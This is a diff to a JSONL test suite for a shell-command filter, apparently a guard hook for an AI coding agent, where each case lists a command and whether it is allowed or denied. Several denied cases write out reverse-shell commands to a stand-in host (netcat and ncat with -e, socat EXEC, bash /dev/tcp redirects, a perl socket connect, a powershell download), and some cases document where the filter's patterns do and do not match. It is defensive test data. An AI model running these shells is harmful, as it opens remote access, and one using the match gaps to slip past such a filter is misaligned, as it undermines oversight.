@@ -1,16 +1,16 @@
-{"expect":"deny","why":"the 13:02 kill — npm view piped into a JSON one-liner","cmd":"npm view aws-cdk-lib versions --json | python3 -c \"import json,sys; v=json.load(sys.stdin); print(v[-5:])\""}
-{"expect":"deny","why":"the 11:58 kill — gh api piped into a JSON one-liner","cmd":"gh api repos/aws/aws-cdk/pulls/32369 | python3 -c \"import json,sys; d=json.load(sys.stdin); print('merged_at:', d.get('merged_at'))\""}
-{"expect":"deny","why":"python2-style, no colon anywhere — COI would let this pass, we do not","cmd":"python -c \"print(1)\""}
-{"expect":"deny","why":"uppercase form still matches after lowercasing","cmd":"PYTHON3 -C \"print(1)\""}
-{"expect":"deny","why":"perl one-liner","cmd":"perl -e 'print 1'"}
-{"expect":"deny","why":"php one-liner","cmd":"php -r 'echo 1;'"}
-{"expect":"deny","why":"ruby one-liner","cmd":"ruby -e 'puts 1'"}
-{"expect":"deny","why":"interactive bash — bypasses COI's network gate, always fires","cmd":"bash -i"}
+{"expect":"allow","why":"the 13:02 kill on v0.12 — `v[-5:]` satisfied the old ':' gate; v0.15 needs a network token, and there is none","cmd":"npm view aws-cdk-lib versions --json | python3 -c \"import json,sys; v=json.load(sys.stdin); print(v[-5:])\""}
+{"expect":"allow","why":"the 11:58 kill on v0.12 — 'merged_at:' is no network token on v0.15","cmd":"gh api repos/aws/aws-cdk/pulls/32369 | python3 -c \"import json,sys; d=json.load(sys.stdin); print('merged_at:', d.get('merged_at'))\""}
+{"expect":"allow","why":"one-liner with no network token — v0.15 lets it pass, so do we","cmd":"python -c \"print(1)\""}
+{"expect":"allow","why":"uppercase one-liner, still no network token","cmd":"PYTHON3 -C \"print(1)\""}
+{"expect":"allow","why":"perl one-liner, no network token","cmd":"perl -e 'print 1'"}
+{"expect":"allow","why":"php one-liner, no network token","cmd":"php -r 'echo 1;'"}
+{"expect":"allow","why":"ruby one-liner, no network token","cmd":"ruby -e 'puts 1'"}
+{"expect":"deny","why":"interactive bash — strong pattern, always CRITICAL","cmd":"bash -i"}
 {"expect":"deny","why":"interactive sh","cmd":"sh -i -c 'echo hi'"}
 {"expect":"deny","why":"netcat with exec","cmd":"nc -e /bin/sh 10.0.0.1 4444"}
 {"expect":"deny","why":"socat — and the 13:12 self-inflicted kill was a command carrying this","cmd":"socat TCP:10.0.0.1:4444 EXEC:/bin/sh"}
 {"expect":"deny","why":"bash tcp redirect","cmd":"bash -c 'exec 3<>/dev/tcp/10.0.0.1/4444'"}
-{"expect":"deny","why":"documentation text is blocked too — deliberate over-block, use Write/Edit","cmd":"cat > notes.md <<'EOF'\nAvoid python3 -c in the container.\nEOF"}
+{"expect":"allow","why":"doc text naming a one-liner without a network token — no longer blocked; strong tokens in file content still are (use Write/Edit)","cmd":"cat > notes.md <<'EOF'\nAvoid python3 -c in the container.\nEOF"}
 {"expect":"allow","why":"the sanctioned replacement — runs as 'python3 -', not on the list","cmd":"python3 - <<'PY'\nimport json\nprint(json.dumps({'a': 1}))\nPY"}
 {"expect":"allow","why":"jq is the preferred JSON tool and matches nothing","cmd":"jq -r '.tool_input.command' file.json"}
 {"expect":"allow","why":"ordinary git","cmd":"git status --short && git log --oneline -3"}
@@ -18,3 +18,52 @@
 {"expect":"allow","why":"a python script file, not -c","cmd":"python3 scripts/build.py --verbose"}
 {"expect":"allow","why":"non-interactive sh -c is fine; only sh -i fires","cmd":"sh -c 'echo hello'"}
 {"expect":"allow","why":"pnpm work","cmd":"CI=true pnpm install --reporter=append-only"}
+{"expect":"deny","why":"one-liner + 'socket' network token","cmd":"python3 -c \"import socket; socket.create_connection(('example.com', 443))\""}
+{"expect":"deny","why":"one-liner + a whitespace-delimited IP","cmd":"python3 -c \"print(1)\" 10.0.0.1 4444"}
+{"expect":"deny","why":"one-liner + a non-loopback host:port elsewhere on the line (the whole command counts)","cmd":"curl -s https://api.example.com:443/v1 | python3 -c \"import json,sys; print(json.load(sys.stdin))\""}
+{"expect":"deny","why":"uppercase still matches after lowercasing","cmd":"PYTHON3 -C \"import socket\""}
+{"expect":"deny","why":"perl one-liner + socket/sockaddr tokens","cmd":"perl -e 'use Socket; connect(S, sockaddr_in(4444, inet_aton(\"10.0.0.1\")))'"}
+{"expect":"allow","why":"loopback host:port is not a network token in COI","cmd":"curl -s http://127.0.0.1:6173/api/health | python3 -c \"import json,sys; print(json.load(sys.stdin)['ok'])\""}
+{"expect":"allow","why":"ssh -i — 'sh -i' glued to 's' is not a match on v0.15","cmd":"ssh -i ~/.ssh/id_ed25519 user@example.com"}
+{"expect":"allow","why":"'sh -i' glued to '.' is not a match","cmd":"./setup.sh -i"}
+{"expect":"deny","why":"'/' is a token boundary","cmd":"/bin/sh -i"}
+{"expect":"deny","why":"one of the thirteen extra shells","cmd":"zsh -i -c 'echo hi'"}
+{"expect":"deny","why":"'sh -i' is glued to 'c' — only csh's own entry catches it","cmd":"csh -i"}
+{"expect":"deny","why":"no trailing anchor — bash -ic still fires","cmd":"bash -ic 'echo hi'"}
+{"expect":"allow","why":"rsync -e — 'nc -e' glued to 'y' is not a match","cmd":"rsync -e ssh src/ host:dst/"}
+{"expect":"deny","why":"ncat with exec","cmd":"ncat -e /bin/bash 10.0.0.1 4444"}
+{"expect":"allow","why":"bare /dev/tcp/ mention followed by a quote","cmd":"grep -rn \"/dev/tcp/\" docs"}
+{"expect":"allow","why":"bare /dev/tcp/ mention followed by a space","cmd":"grep -rn /dev/tcp/ docs"}
+{"expect":"allow","why":"loopback endpoint — COI exempts it","cmd":"timeout 1 bash -c '</dev/tcp/localhost/6173' && echo up"}
+{"expect":"deny","why":"remote endpoint after /dev/tcp/","cmd":"exec 3<>/dev/tcp/10.0.0.1/4444"}
+{"expect":"deny","why":"a loopback probe does not hide a remote one on the same line","cmd":"cat </dev/tcp/localhost/6173; cat </dev/tcp/10.0.0.1/4444"}
+{"expect":"deny","why":"udp variant","cmd":"echo x > /dev/udp/10.0.0.1/53"}
+{"expect":"deny","why":"strong token in any argv — grepping for it kills","cmd":"grep -rn socket.socket src/"}
+{"expect":"deny","why":"strong token in any argv","cmd":"grep -rn fsockopen vendor/"}
+{"expect":"allow","why":"the advised escaped fragment","cmd":"grep -rn \"socket\\.sock\" src/"}
+{"expect":"allow","why":"bare socat, no network token","cmd":"sudo apt-get install -y socat"}
+{"expect":"allow","why":"bare powershell, no network token","cmd":"grep -ri powershell docs/"}
+{"expect":"deny","why":"socat + exec: needs no network token","cmd":"socat stdio exec:/bin/sh"}
+{"expect":"deny","why":"powershell + host:port","cmd":"powershell -c iwr http://10.0.0.1:8000/x"}
+{"expect":"allow","why":"exec: without socat","cmd":"rg \"exec:\" src/"}
+{"expect":"allow","why":"perl -MIO::File is not the socket module","cmd":"perl -MIO::File -e 'print 1'"}
+{"expect":"deny","why":"bare perl -MIO","cmd":"perl -MIO -e 'print 1'"}
+{"expect":"deny","why":"Sigma pause — /curl as a path segment","cmd":"cat docs/vendor/curl/README.md"}
+{"expect":"deny","why":"Sigma pause — absolute binary path","cmd":"/usr/bin/curl -fsSL https://example.com -o out.html"}
+{"expect":"deny","why":"Sigma pause — the 2026-10-13 shape, /curl inside a grep pattern","cmd":"grep -rnE 'fetch|/curl' docs"}
+{"expect":"deny","why":"Sigma pause — /wget","cmd":"ls -l /usr/bin/wget"}
+{"expect":"allow","why":"bare curl has no leading slash","cmd":"curl -fsSL https://example.com -o out.html"}
+{"expect":"deny","why":"exec watcher node-reverse-shell: node -e + child_process + net (pause)","cmd":"node -e \"const cp = require('child_process'); const net = require('net')\""}
+{"expect":"allow","why":"node -e with child_process but no 'net'","cmd":"node -e \"console.log(require('child_process').execSync('git rev-parse HEAD').toString())\""}
+{"expect":"deny","why":"exec watcher nc-exec: '-e' anywhere in an nc command — here inside 'us-east-1' (pause)","cmd":"nc -z dynamodb.us-east-1.amazonaws.com 443"}
+{"expect":"allow","why":"nc without '-e' anywhere on the line","cmd":"nc -z localhost 6173"}
+{"expect":"allow","why":"the '-e' belongs to set, not to nc's own argv","cmd":"set -e; nc -z localhost 5432"}
+{"expect":"allow","why":"the '-e' belongs to grep, after &&","cmd":"nc -z localhost 6173 && grep -e x f"}
+{"expect":"deny","why":"argv0 only has to START with nc — nc.openbsd with '-e' inside a hostname","cmd":"nc.openbsd -z db.us-east-1.example.com 443"}
+{"expect":"deny","reason":"netcat exec pattern","why":"a backslash continuation puts the hostname on the next line, still in nc's argv","cmd":"nc -zv \\\ndynamodb.us-east-1.amazonaws.com 443"}
+{"expect":"deny","reason":"netcat exec pattern","why":"the hostname reaches nc's argv through a variable from another segment","cmd":"H=db.us-east-1.example.com; nc -z $H 443"}
+{"expect":"deny","reason":"netcat exec pattern","why":"the hostname reaches nc's argv through xargs","cmd":"echo db.us-east-1.example.com | xargs nc -z"}
+{"expect":"allow","why":"a continuation with no '-e' anywhere","cmd":"nc -zv \\\nlocalhost 6173"}
+{"expect":"allow","why":"a glued '-e' with no nc on the line","cmd":"aws s3 ls --region us-east-1"}
+{"expect":"deny","reason":"Sigma","why":"the Monitor tool runs a shell command too — same rules","tool":"Monitor","cmd":"tail -f docs/curl/log.txt | grep --line-buffered x"}
+{"expect":"allow","why":"an ordinary Monitor until-loop","tool":"Monitor","cmd":"until [ -f out.txt ]; do sleep 1; done; echo ready"}
